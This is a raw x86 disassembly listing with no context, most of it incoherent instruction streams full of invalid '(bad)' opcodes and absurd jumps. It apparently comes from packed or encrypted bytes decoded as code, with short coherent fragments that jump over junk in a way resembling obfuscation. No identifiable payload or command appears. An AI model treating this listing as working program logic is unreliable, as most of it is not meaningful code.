  40197f:	mov    ch,0x1a
  401981:	test   al,0xf5
  401983:	stos   DWORD PTR es:[edi],eax
  401984:	xchg   BYTE PTR ds:0x31127696,bl
  40198a:	cmp    eax,0x83ff0976
  40198f:	or     esi,0x4fd840f5
  401995:	mov    ch,0xbc
  401997:	loop   0x401930
  401999:	xor    BYTE PTR [ebx],cl
  40199b:	mov    ch,cl
  40199d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40199e:	gs cmc 
  4019a0:	push   esi
  4019a1:	loope  0x4019f0
  4019a3:	fiadd  DWORD PTR [ebx+0x42]
  4019a6:	jl     0x4019c0
  4019a8:	dec    ebx
  4019a9:	popfw  
  4019ab:	dec    esi
  4019ac:	out    dx,eax
  4019ad:	cmp    ebx,DWORD PTR [ebx-0x45]
  4019b0:	or     dh,BYTE PTR [edi+esi*4-0x74311d6d]
  4019b7:	or     BYTE PTR [ecx],0x80
  4019ba:	jmp    0x401a05
  4019bc:	push   ebp
  4019bd:	pushf  
  4019be:	call   0x5437ebfc
  4019c3:	and    bh,BYTE PTR [ebx-0x6e]
  4019c6:	xchg   edi,eax
  4019c7:	push   ds
  4019c8:	push   ss
  4019c9:	pop    ebx
  4019ca:	push   edx
  4019cb:	jle    0x40197b
  4019cd:	sbb    dh,BYTE PTR [ebx-0x4b7f1e18]
  4019d3:	mov    cs,WORD PTR [ecx+0x41]
  4019d6:	daa    
  4019d7:	jg     0x40198e
  4019d9:	pop    ebx
  4019da:	aam    0x3
  4019dc:	dec    ebx
  4019dd:	mov    al,bl
  4019df:	js     0x401a38
  4019e1:	nop
  4019e2:	scas   eax,DWORD PTR es:[edi]
  4019e3:	xchg   DWORD PTR [eax+ebx*2],esp
  4019e6:	pushf  
  4019e7:	retf   
  4019e8:	cmp    ecx,DWORD PTR [edx-0x46]
  4019eb:	pop    esp
  4019ec:	retf   
  4019ed:	jge    0x4019ef
  4019ef:	dec    edi
  4019f0:	sbb    eax,0x95693c1b
  4019f5:	cmc    
  4019f6:	inc    ebp
  4019f7:	adc    DWORD PTR [ecx+0x11923dd8],0x54
  4019fe:	dec    edx
  4019ff:	xchg   edx,eax
  401a00:	pop    ebp
  401a01:	xchg   esp,eax
  401a02:	mov    al,ds:0xeeedc3d7
  401a07:	dec    edx
  401a08:	mov    bl,0xf6
  401a0a:	xchg   ecx,eax
  401a0b:	jno    0x401a2a
  401a0d:	cwde   
  401a0e:	jmp    0xbb6e12f9
  401a13:	jecxz  0x401a44
  401a15:	fnstenv [eax-0xa0587d0]
  401a1b:	fcomp  QWORD PTR [eax+0x2e3e6833]
  401a21:	mov    ah,0x85
  401a23:	outs   dx,DWORD PTR ds:[esi]
  401a24:	mov    ch,0x9e
  401a26:	outs   dx,DWORD PTR ds:[esi]
  401a27:	pop    ds
  401a28:	lock (bad) 
  401a2a:	cmp    BYTE PTR [ebp+eiz*8-0x7b],cl
  401a2e:	xor    esi,ebx
  401a30:	es jge 0x401a69
  401a33:	add    edi,DWORD PTR [eax*1-0x3c1dbea7]
  401a3a:	(bad)  
  401a3b:	xor    BYTE PTR [esi-0x51e4827b],dl
  401a41:	inc    ebx
  401a42:	lods   al,BYTE PTR ds:[esi]
  401a43:	add    ch,BYTE PTR [esi]
  401a45:	xchg   ebp,eax
  401a46:	js     0x401ab0
  401a48:	xor    al,0xa9
  401a4a:	(bad)  
  401a4b:	mov    eax,ds:0x2d636222
  401a50:	jle    0x401ac3
  401a52:	in     eax,dx
  401a53:	in     eax,dx
  401a54:	out    dx,al
  401a55:	xchg   ecx,eax
  401a56:	and    al,0xcf
  401a58:	dec    esi
  401a59:	add    cl,dh
  401a5b:	cmp    DWORD PTR [edx+0x140d010],0x5e9ecfa5
  401a65:	(bad)  
  401a66:	shr    DWORD PTR [edi-0x43],cl
  401a69:	mov    edi,DWORD PTR [ebx+edi*4]
  401a6c:	add    al,0x64
  401a6e:	dec    eax
  401a6f:	push   eax
  401a70:	add    DWORD PTR [ecx+0x648f70e1],eax
  401a76:	xchg   ecx,eax
  401a77:	mov    DWORD PTR [ebp-0x50],ebx
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	rol    DWORD PTR [ebp+0x2b],cl
  401a8e:	push   esi
  401a8f:	push   cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a35
  401a98:	fwait
  401a99:	adc    DWORD PTR [edi-0x78a9e51d],esp
  401a9f:	jmp    0xbf89:0xc4bc3edb
  401aa6:	dec    ebp
  401aa7:	jmp    0x401a85
  401aa9:	pop    ebx
  401aaa:	xor    eax,0xd38a9a13
  401aaf:	pop    ecx
  401ab0:	call   0x562f:0x860ac162
  401ab7:	ror    esi,0x76
  401aba:	push   eax
  401abb:	ret    0x2543
  401abe:	or     al,0xe0
  401ac0:	mov    ds,WORD PTR [ecx-0x16]
  401ac3:	imul   esp,esp,0xffffffe9
  401ac6:	jb     0x401af7
  401ac8:	inc    edx
  401ac9:	pop    eax
  401aca:	lea    ebx,es:[ebx-0x7d]
  401ace:	aam    0x4f
  401ad0:	mov    dl,0xcb
  401ad2:	sbb    al,0x21
  401ad4:	out    dx,al
  401ad5:	xchg   ebx,eax
  401ad6:	push   edx
  401ad7:	push   ebp
  401ad8:	inc    ebx
  401ad9:	jl     0x401b42
  401adb:	popf   
  401adc:	test   BYTE PTR [ebx+0x70],dl
  401adf:	js     0x401a88
  401ae1:	stos   BYTE PTR es:[edi],al
  401ae2:	or     eax,0x11bf1e8e
  401ae7:	fstp   DWORD PTR [edi-0x2b]
  401aea:	int    0x16
  401aec:	sbb    eax,DWORD PTR [ebp+0x22da1a0b]
  401af2:	fdivr  DWORD PTR ds:0xf0dd4e99
  401af8:	ins    DWORD PTR es:[edi],dx
  401af9:	adc    cl,ch
  401afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401afc:	sbb    al,0xd5
  401afe:	inc    ebp
  401aff:	push   cs
  401b00:	xchg   esi,eax
  401b01:	sub    edx,eax
  401b03:	pop    es
  401b04:	jl     0x401b5d
  401b06:	sbb    dh,al
  401b08:	scas   al,BYTE PTR es:[edi]
  401b09:	inc    esi
  401b0a:	sub    edi,DWORD PTR [ecx]
  401b0c:	pop    esi
  401b0d:	int3   
  401b0e:	mov    es,WORD PTR [esi+0x5c]
  401b11:	add    ah,bh
  401b13:	loopne 0x401af5
  401b15:	sahf   
  401b16:	cli    
  401b17:	cmp    ah,ah
  401b19:	cdq    
  401b1a:	jae    0x401b60
  401b1c:	lea    ebp,[eax]
  401b1e:	pop    esi
  401b1f:	retf   
  401b20:	xchg   ebp,eax
  401b21:	xor    DWORD PTR [esi-0x66b0f655],esi
  401b27:	push   0xfffffffb
  401b29:	add    esp,ebp
  401b2b:	mov    eax,0xd252f5fd
  401b30:	in     eax,0x33
  401b32:	and    ebp,DWORD PTR [esi]
  401b34:	idiv   BYTE PTR [eax]
  401b36:	or     DWORD PTR [esi+0x79],ecx
  401b39:	imul   esi,DWORD PTR [edi-0x6f],0xcd359946
  401b40:	loopne 0x401b91
  401b42:	jb     0x401b02
  401b44:	jge    0x401aeb
  401b46:	shl    DWORD PTR [ebx],0x88
  401b49:	dec    edx
  401b4a:	xchg   esp,eax
  401b4b:	jnp    0x401bbb
  401b4d:	xor    BYTE PTR [edx+0x14aa893d],dl
  401b53:	mov    ch,0x9f
  401b55:	out    0x76,al
  401b57:	stos   BYTE PTR es:[edi],al
  401b58:	and    BYTE PTR [eax+0x71f76a1f],cl
  401b5e:	fldpi  
  401b60:	pop    eax
  401b61:	lock xlat BYTE PTR ds:[ebx]
  401b63:	cmp    eax,0xd5abddfd
  401b68:	push   esi
  401b69:	and    eax,0xa9d1fb52
  401b6e:	loopne 0x401af4
  401b70:	clc    
  401b71:	popa   
  401b72:	es pusha 
  401b74:	push   ebx
  401b75:	inc    ebx
  401b76:	pop    ds
  401b77:	mov    edi,0x492afc66
  401b7c:	(bad)  
  401b7d:	xor    DWORD PTR [ebx-0x5],edi
  401b80:	mov    bh,0x5a
  401b82:	adc    ch,bl
  401b84:	daa    
  401b85:	sub    DWORD PTR [ecx],edi
  401b87:	and    esp,DWORD PTR [ebp-0x45]
  401b8a:	mov    ebp,0x7aa6663e
  401b8f:	push   es
  401b90:	pop    ebp
  401b91:	aaa    
  401b92:	mov    ebx,0x14fe4de8
  401b97:	or     BYTE PTR [edi-0x41],cl
  401b9a:	adc    ecx,edi
  401b9c:	push   ebp
  401b9d:	push   ebx
  401b9e:	stos   DWORD PTR es:[edi],eax
  401b9f:	dec    edi
  401ba0:	sbb    DWORD PTR [eax-0x72901882],0xfffffffe
  401ba7:	imul   ecx,DWORD PTR [edi+0xd],0xfffa03aa
  401bae:	pop    esp
  401baf:	fcmove st,st(5)
  401bb1:	lds    ecx,FWORD PTR [esi+0x26]
  401bb4:	and    edx,DWORD PTR [ecx]
  401bb6:	sub    BYTE PTR [ebx+esi*4+0x7e8315c2],al
  401bbd:	aad    0x4d
  401bbf:	loopne 0x401b48
  401bc1:	dec    eax
  401bc2:	into   
  401bc3:	loopne 0x401b83
  401bc5:	cli    
  401bc6:	loopne 0x401b99
  401bc8:	test   al,0x27
  401bca:	int    0x32
  401bcc:	jno    0x401c47
  401bce:	ins    BYTE PTR es:[edi],dx
  401bcf:	in     al,dx
  401bd0:	and    ecx,DWORD PTR [ecx+eiz*4+0x75155dda]
  401bd7:	or     esi,esi
  401bd9:	(bad)  
  401bda:	fs in  al,0x21
  401bdd:	xchg   edi,eax
  401bde:	fisubr WORD PTR [ebx]
  401be0:	das    
  401be1:	xor    edx,ebp
  401be3:	cld    
  401be4:	ret    
  401be5:	test   eax,0xfdefa867
  401bea:	push   es
  401beb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bec:	(bad)  
  401bed:	jp     0x401b8b
  401bef:	or     DWORD PTR [ebx+0x49],ecx
  401bf2:	xor    BYTE PTR [ebx],bl
  401bf4:	enter  0xafe1,0xb
  401bf8:	imul   eax,ebp,0x1631c13
  401bfe:	icebp  
  401bff:	mov    ah,BYTE PTR [ecx+0x2b663a96]
  401c05:	addr16 aam 0x8b
  401c08:	mov    ds:0xe2fcc3ee,eax
  401c0d:	shl    cl,cl
  401c0f:	stos   DWORD PTR es:[edi],eax
  401c10:	mov    edi,0x419442fa
  401c15:	daa    
  401c16:	push   ebp
  401c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c18:	lds    edi,FWORD PTR [esi-0x4fba74b8]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	mov    eax,0x8ada08d0
  401c45:	jns    0x401cc5
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c3e
  401c4d:	mov    ds:0x1b0b1a10,eax
  401c52:	leave  
  401c53:	clc    
  401c54:	and    ch,BYTE PTR [edx-0x33a71c1d]
  401c5a:	and    BYTE PTR [edx+0x60fcf3e1],0x5d
  401c61:	cmp    eax,0x28f8f49e
  401c66:	cmp    eax,DWORD PTR [eax]
  401c68:	dec    ebp
  401c69:	adc    DWORD PTR [eax+0x63],esp
  401c6c:	sbb    eax,0xed373560
  401c71:	jne    0x401c0f
  401c73:	lahf   
  401c74:	iret   
  401c75:	or     eax,0x1dbf6261
  401c7a:	adc    edx,DWORD PTR [ebx-0x6e]
  401c7d:	ins    BYTE PTR es:[edi],dx
  401c7e:	fisttp DWORD PTR [ebp-0x27d6402c]
  401c84:	sar    DWORD PTR [edx+ebx*1+0x4a9b7d62],0xf1
  401c8c:	adc    eax,0x4ba1cd6d
  401c91:	jo     0x401c22
  401c93:	adc    eax,ebx
  401c95:	xorps  xmm1,XMMWORD PTR [ebx-0x1674a4fe]
  401c9c:	out    dx,eax
  401c9d:	xchg   edx,esp
  401c9f:	pop    ds
  401ca0:	sbb    DWORD PTR [ecx-0x796f30f],esi
  401ca6:	mov    ch,0x68
  401ca8:	jg     0x401cf1
  401caa:	loope  0x401c7a
  401cac:	jno    0x401c5b
  401cae:	fidivr WORD PTR [ebp-0x6]
  401cb1:	pop    eax
  401cb2:	sar    BYTE PTR [ebx],cl
  401cb4:	sbb    dl,BYTE PTR [ebx+esi*2-0x38]
  401cb8:	out    0x99,eax
  401cba:	cli    
  401cbb:	xor    eax,DWORD PTR [edi+0x25b35c83]
  401cc1:	jmp    0x401cfc
  401cc3:	sti    
  401cc4:	or     eax,0x3d71b018
  401cc9:	xchg   edi,eax
  401cca:	int3   
  401ccb:	out    dx,eax
  401ccc:	mov    ebx,0xdc7250e0
  401cd1:	rol    BYTE PTR [ecx+0x5434f36c],1
  401cd7:	or     DWORD PTR [edi+ebx*8],0x27
  401cdb:	out    0x9a,eax
  401cdd:	jne    0x401c6e
  401cdf:	jo     0x401d41
  401ce1:	jne    0x401d25
  401ce3:	inc    ecx
  401ce4:	push   es
  401ce5:	or     al,0xbd
  401ce7:	adc    al,0x3
  401ce9:	cs jo  0x401ccb
  401cec:	pop    ss
  401ced:	les    ebx,FWORD PTR [esp+eax*4]
  401cf0:	div    ebx
  401cf2:	aam    0x8a
  401cf4:	call   0x36198b18
  401cf9:	dec    esp
  401cfa:	inc    esp
  401cfb:	xchg   edx,eax
  401cfc:	mov    ch,0xfd
  401cfe:	mov    al,ds:0xdd08d31a
  401d03:	das    
  401d04:	aas    
  401d05:	push   0x65dbfdcd
  401d0a:	sbb    BYTE PTR [ebx],bh
  401d0c:	adc    eax,0x9d0a2797
  401d11:	hlt    
  401d12:	pop    ecx
  401d13:	mov    esp,0xb37aa643
  401d18:	xchg   ebp,eax
  401d19:	mov    gs,WORD PTR [eax]
  401d1b:	aam    0xd3
  401d1d:	into   
  401d1e:	mov    al,BYTE PTR [edx-0x195441ea]
  401d24:	xor    WORD PTR [edi-0x54],0x1c
  401d29:	fwait
  401d2a:	int    0xb7
  401d2c:	sahf   
  401d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d2e:	push   ebp
  401d2f:	mov    WORD PTR [ecx+edi*2+0x24418891],?
  401d36:	repz pop edi
  401d38:	ss inc edx
  401d3a:	adc    eax,0x1b01eff3
  401d3f:	fistp  WORD PTR ds:0x34b5b956
  401d45:	ret    
  401d46:	or     ecx,DWORD PTR [ebx+0x4c]
  401d49:	inc    esp
  401d4a:	and    al,0x23
  401d4c:	and    DWORD PTR [ebp-0x31e5f23],esp
  401d52:	pop    esi
  401d53:	sbb    DWORD PTR [eax+ecx*2],edi
  401d56:	lods   eax,DWORD PTR ds:[esi]
  401d57:	iret   
  401d58:	ss daa 
  401d5a:	mov    bh,BYTE PTR [ecx-0x761daeb3]
  401d60:	push   edx
  401d61:	mov    ds:0x9621199b,eax
  401d66:	mov    edx,0x7b9b9fa1
  401d6b:	xlat   BYTE PTR ds:[ebx]
  401d6c:	mov    dh,0x75
  401d6e:	cmp    DWORD PTR [ecx+0x3b],edi
  401d71:	jmp    0xbc63:0x97bb6679
  401d78:	xchg   edi,eax
  401d79:	cmp    DWORD PTR [edx+0x1edfb42e],esi
  401d7f:	mov    edx,0xe2248901
  401d84:	daa    
  401d85:	ins    DWORD PTR es:[edi],dx
  401d86:	pusha  
  401d87:	dec    esp
  401d88:	sub    eax,0x9df180a
  401d8d:	fwait
  401d8e:	aaa    
  401d8f:	mov    cl,BYTE PTR [esi-0x17]
  401d92:	sub    esp,DWORD PTR [eax-0x3c]
  401d95:	pop    ss
  401d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d97:	pop    ebp
  401d98:	cs push esp
  401d9a:	cmp    BYTE PTR [esi+0x37],dl
  401d9d:	mov    al,ds:0x44bf0417
  401da2:	popf   
  401da3:	in     al,0xc5
  401da5:	and    al,BYTE PTR [eax+0x35]
  401da8:	push   ss
  401da9:	inc    edx
  401daa:	mov    ebp,0xa8776ea0
  401daf:	mov    bh,0xa0
  401db1:	ftst   
  401db3:	add    al,0x43
  401db5:	mov    gs,WORD PTR [edx-0x26]
  401db8:	xor    bl,ah
  401dba:	or     eax,0x8f523a60
  401dbf:	mov    dh,0xb4
  401dc1:	push   ds
  401dc2:	sub    ch,BYTE PTR [esi]
  401dc4:	cli    
  401dc5:	or     al,0x65
  401dc7:	das    
  401dc8:	pop    edx
  401dc9:	imul   edx,esi,0x2f4c6c0c
  401dcf:	ins    DWORD PTR es:[edi],dx
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x209167c8],ebp
  401e0d:	or     edx,DWORD PTR [esi]
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e5c
  401e17:	jle    0x401dfd
  401e19:	add    ebx,ebx
  401e1b:	dec    esp
  401e1c:	pop    ds
  401e1d:	cmp    al,BYTE PTR [edx+0x7dfd1343]
  401e23:	mov    eax,0x8b9aeb8c
  401e28:	jno    0x401db9
  401e2a:	ffreep st(2)
  401e2c:	sbb    bh,BYTE PTR [eax+0x8]
  401e2f:	dec    esi
  401e30:	sub    ch,BYTE PTR [eax]
  401e32:	(bad)  
  401e34:	pop    esi
  401e35:	fisttp QWORD PTR [edi-0x12]
  401e38:	data16 sbb BYTE PTR [edx+edi*4-0x45],bl
  401e3d:	outs   dx,DWORD PTR ds:[esi]
  401e3e:	sbb    DWORD PTR [edi+0x66d1ce89],edx
  401e44:	push   0xffffff8e
  401e46:	imul   edx,DWORD PTR ds:0x24e2b8b2,0x44
  401e4d:	xor    eax,DWORD PTR [esi-0xcfff360]
  401e53:	fsub   QWORD PTR [ebx+ebx*2+0x2f]
  401e57:	sti    
  401e58:	sbb    eax,0xc87e78c
  401e5d:	inc    edi
  401e5e:	dec    ecx
  401e5f:	jl     0x401e8c
  401e61:	xchg   edx,eax
  401e62:	retf   0xa91c
  401e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e66:	dec    esp
  401e67:	xor    ecx,DWORD PTR [esi]
  401e69:	mov    BYTE PTR [eax-0x21],dl
  401e6c:	mov    al,BYTE PTR [ebx]
  401e6e:	dec    edi
  401e6f:	imul   esp,DWORD PTR [edx],0xffffff87
  401e72:	add    ch,BYTE PTR [edx-0x46]
  401e75:	push   esp
  401e76:	das    
  401e77:	(bad)  
  401e78:	jecxz  0x401e32
  401e7a:	xor    DWORD PTR [edx],0x9a790d71
  401e80:	adc    dh,BYTE PTR [ebp+0x808a709]
  401e86:	in     eax,0x7b
  401e88:	cmc    
  401e89:	pop    es
  401e8a:	dec    ebp
  401e8b:	push   edi
  401e8c:	fcomp  st(2)
  401e8e:	mov    ebx,0x33693c92
  401e93:	and    DWORD PTR [ebx],esi
  401e95:	test   dl,dl
  401e97:	xor    BYTE PTR [eax],ah
  401e99:	lods   al,BYTE PTR ds:[esi]
  401e9a:	jno    0x401e3f
  401e9c:	cmp    DWORD PTR [ecx],edi
  401e9e:	loope  0x401ee4
  401ea0:	add    BYTE PTR [edi+0x72],bh
  401ea3:	loopne 0x401e69
  401ea5:	cwde   
  401ea6:	aas    
  401ea7:	dec    ebp
  401ea8:	in     al,0x4f
  401eaa:	ja     0x401f0a
  401eac:	and    DWORD PTR [ebx-0x5c849696],edx
  401eb2:	mov    ebp,ebx
  401eb4:	add    al,0x2d
  401eb6:	hlt    
  401eb7:	repnz push DWORD PTR fs:[edx]
  401ebb:	fldcw  WORD PTR [ecx-0x3bee724b]
  401ec1:	jns    0x401ea5
  401ec3:	jp     0x401e53
  401ec5:	popf   
  401ec6:	mov    ?,WORD PTR [edi-0x5c]
  401ec9:	jo     0x401ee3
  401ecb:	dec    edi
  401ecc:	lea    ecx,[edi+edx*2-0x1]
  401ed0:	bound  esi,QWORD PTR [edi-0x7]
  401ed3:	pop    edi
  401ed4:	inc    ecx
  401ed5:	(bad)  
  401ed7:	xchg   ebp,eax
  401ed8:	in     eax,dx
  401ed9:	add    DWORD PTR [edx-0x24a37cda],0x7b
  401ee0:	rcr    BYTE PTR [eax],1
  401ee2:	sbb    esp,DWORD PTR [ebx+0x9]
  401ee5:	arpl   WORD PTR [ebp+0x21],si
  401ee8:	adc    eax,0x39be65b6
  401eed:	cmp    DWORD PTR [ebx+0x1bf650a4],0x7a282b14
  401ef7:	lahf   
  401ef8:	sub    DWORD PTR [ebx+0x6b8e79df],ebx
  401efe:	fcomip st,st(5)
  401f00:	sahf   
  401f01:	pop    es
  401f02:	outs   dx,BYTE PTR ds:[esi]
  401f03:	and    dh,al
  401f05:	lea    edx,[edx]
  401f07:	in     eax,dx
  401f08:	sbb    edi,DWORD PTR [esp+edx*4-0x2987d81b]
  401f0f:	(bad)  
  401f11:	ja     0x401f7d
  401f13:	ret    0xbee8
  401f16:	fistp  WORD PTR [edx-0x70c17315]
  401f1c:	sbb    eax,0x22a4eb93
  401f21:	xlat   BYTE PTR ds:[ebx]
  401f22:	out    dx,al
  401f23:	into   
  401f24:	cmp    dh,ah
  401f26:	popa   
  401f27:	pop    es
  401f28:	add    BYTE PTR [ebx+0x76d7337],bh
  401f2e:	jmp    0x9f7c:0x994bc315
  401f35:	js     0x401ec3
  401f37:	dec    eax
  401f38:	pop    esi
  401f39:	sub    al,0xa7
  401f3b:	out    0x5b,eax
  401f3d:	pop    ecx
  401f3e:	push   esp
  401f3f:	mov    al,ds:0x53c670b5
  401f44:	loop   0x401f38
  401f46:	(bad)  
  401f48:	(bad)  
  401f4a:	cmc    
  401f4b:	into   
  401f4c:	mov    ?,WORD PTR [edi+0x2d]
  401f4f:	xor    BYTE PTR [eax+0x2],dh
  401f52:	lods   eax,DWORD PTR ds:[esi]
  401f53:	push   eax
  401f54:	xor    al,0x76
  401f56:	jbe    0x401f1e
  401f58:	pop    ebp
  401f59:	mov    bl,0xac
  401f5b:	dec    eax
  401f5c:	(bad)  
  401f5d:	push   cs
  401f5e:	fcmovu st,st(0)
  401f60:	jge    0x401f3b
  401f62:	lods   al,BYTE PTR ds:[esi]
  401f63:	aad    0xd9
  401f65:	in     al,0x2f
  401f67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f68:	test   eax,0x859ce999
  401f6d:	enter  0x5fae,0x4e
  401f71:	sbb    BYTE PTR [ecx],0xaa
  401f74:	inc    edi
  401f75:	cmc    
  401f76:	mov    bh,0x82
  401f78:	cs xchg edi,eax
  401f7a:	dec    edi
  401f7b:	push   0x64fd64bd
  401f80:	inc    ebx
  401f81:	jno    0x401f98
  401f83:	in     al,0x99
  401f85:	mov    eax,ds:0xa1ca04d
  401f8a:	cwde   
  401f8b:	sub    eax,0xfe85bd89
  401f90:	or     BYTE PTR [esi],al
  401f92:	dec    esi
  401f93:	les    eax,FWORD PTR [edi+eiz*2]
  401f96:	loope  0x401f4e
  401f98:	(bad)  
  401f99:	out    dx,eax
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xc1b6f992
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401fc2
  401fcc:	dec    edi
  401fcd:	mov    dh,0x72
  401fcf:	imul   ebp
  401fd1:	xchg   esi,eax
  401fd2:	push   edi
  401fd3:	jns    0x401f9d
  401fd5:	jmp    FWORD PTR [ecx]
  401fd7:	mov    dl,0x30
  401fd9:	mov    BYTE PTR [eax-0x7f],dl
  401fdc:	loop   0x402013
  401fde:	pop    ecx
  401fdf:	mov    al,ds:0x5555af60
  401fe4:	and    DWORD PTR [ecx+0x3c2ad7b7],0x3476143
  401fee:	stos   DWORD PTR es:[edi],eax
  401fef:	shl    ecx,0xed
  401ff2:	push   eax
  401ff3:	add    al,0x5c
  401ff5:	jb     0x401fc8
  401ff7:	xchg   ecx,eax
  401ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ff9:	mov    esi,eax
  401ffb:	adc    edi,eax
  401ffd:	inc    edx
  401ffe:	sbb    al,bl
  402000:	jo     0x401fee
  402002:	xor    eax,0x1dde148d
  402007:	dec    edi
  402008:	loope  0x401f9a
  40200a:	imul   ebp,ecx,0xffffffec
  40200d:	not    DWORD PTR [ebp+0xc]
  402010:	inc    edi
  402011:	cmp    eax,0x301346b9
  402016:	in     al,dx
  402017:	sub    eax,0x5be672b9
  40201c:	and    ecx,DWORD PTR [ecx]
  40201e:	inc    esp
  40201f:	lods   al,BYTE PTR ds:[esi]
  402020:	icebp  
  402021:	or     BYTE PTR [eax+0xa],al
  402024:	in     eax,0xa2
  402026:	mov    cl,bh
  402028:	push   edi
  402029:	jp     0x401ff1
  40202b:	dec    eax
  40202c:	mov    edi,0x1f4a9ca4
  402031:	leave  
  402032:	xchg   ecx,eax
  402033:	dec    ebx
  402034:	add    al,0xd0
  402036:	(bad)  
  402037:	xchg   edx,eax
  402038:	test   eax,0xcaed8cc3
  40203d:	in     eax,0x42
  40203f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402040:	mov    DWORD PTR ds:0x14f0ed09,ecx
  402046:	cmp    ch,bh
  402048:	out    0xae,eax
  40204a:	in     eax,0x6f
  40204c:	inc    ebp
  40204d:	in     al,0x9e
  40204f:	es in  al,0x3a
  402052:	neg    cl
  402054:	cmp    BYTE PTR [edx+0x58663d32],dh
  40205a:	pop    esi
  40205b:	imul   ecx,DWORD PTR [edi-0x310bb42d],0xffffffd1
  402062:	rcl    BYTE PTR [esi-0x1786539c],0x1e
  402069:	jge    0x40202c
  40206b:	xlat   BYTE PTR ds:[ebx]
  40206c:	pushf  
  40206d:	aaa    
  40206e:	fisttp WORD PTR [eax-0x5f670a70]
  402074:	sub    BYTE PTR [ecx+0x45],ah
  402077:	inc    ebp
  402078:	mov    al,0xbd
  40207a:	xchg   ebx,eax
  40207b:	inc    eax
  40207c:	fmul   QWORD PTR [eax]
  40207e:	xor    esi,ebp
  402080:	pusha  
  402081:	idiv   BYTE PTR [ecx-0x29c3bcec]
  402087:	mov    al,BYTE PTR [edx]
  402089:	lock push cs
  40208b:	push   ebx
  40208c:	call   0x3aee1cab
  402091:	(bad)  
  402092:	mov    ecx,0xcf773496
  402097:	lods   eax,DWORD PTR ds:[esi]
  402098:	mov    cl,0x45
  40209a:	adc    ah,BYTE PTR [edx]
  40209c:	mov    ah,0xb2
  40209e:	test   DWORD PTR [ebp+0x18],edx
  4020a1:	jnp    0x4020be
  4020a3:	sbb    eax,0xab27fa2e
  4020a8:	(bad)  
  4020a9:	fxtract 
  4020ab:	clc    
  4020ac:	sub    DWORD PTR [ebp+0x71e5bc41],0xffffffef
  4020b3:	xchg   edx,eax
  4020b4:	push   ds
  4020b5:	mov    dl,0xd9
  4020b7:	les    ebx,FWORD PTR [edx-0x49a5c12e]
  4020bd:	stos   DWORD PTR es:[edi],eax
  4020be:	mov    dh,0x8
  4020c0:	popf   
  4020c1:	or     dh,dl
  4020c3:	pop    ds
  4020c4:	je     0x40210c
  4020c6:	and    eax,0xd835fa51
  4020cb:	ror    DWORD PTR [ecx+ecx*8],cl
  4020ce:	push   eax
  4020cf:	xor    DWORD PTR [edx-0xa],eax
  4020d2:	ja     0x4020d1
  4020d4:	sub    ch,BYTE PTR [eax+0x7d0195f9]
  4020da:	xchg   edx,eax
  4020db:	(bad)  
  4020dc:	sub    bl,BYTE PTR [eax+0x3152b853]
  4020e2:	test   eax,0xef22b354
  4020e7:	ins    BYTE PTR es:[edi],dx
  4020e8:	add    ah,0x39
  4020eb:	bound  esi,QWORD PTR [eax+0x6f21a9df]
  4020f1:	mov    sp,ss
  4020f4:	inc    esi
  4020f5:	mov    al,0x4e
  4020f7:	std    
  4020f8:	(bad)  
  4020f9:	cmp    eax,0x934bf413
  4020fe:	or     al,0x40
  402100:	jge    0x4020cb
  402102:	mov    ah,0x88
